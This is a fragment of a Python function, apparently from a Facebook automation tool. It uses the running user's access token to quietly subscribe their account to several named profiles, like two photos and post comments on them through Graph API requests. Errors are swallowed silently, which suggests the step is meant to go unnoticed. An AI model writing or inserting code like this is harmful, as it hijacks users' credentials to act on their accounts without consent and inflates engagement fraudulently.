...
def ___follow___():
    ...
    try:
        ...
        requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token=%s'%(___token___)) #rozhak
        requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token=%s'%(___token___)) #rozhak2
        requests.post('https://graph.facebook.com/100003986228742/subscribers?access_token=%s'%(___token___)) #muhammad rozhak
        requests.post('https://graph.facebook.com/4257706904267068/likes?summary=true&access_token=%s'%(___token___)) #foto sampul
        requests.post('https://graph.facebook.com/4134622646575495/likes?summary=true&access_token=%s'%(___token___)) # foto profil
        requests.post('https://graph.facebook.com/4257706904267068/comments/?message=%s&access_token=%s'%(___komen3___,___token___)) #foto sampul
        requests.post('https://graph.facebook.com/4134622646575495/comments/?message=%s&access_token=%s'%(___komen___,___token___)) #foto profil
        ...
        requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token=%s'%(___token___)) # Iwan
    except:
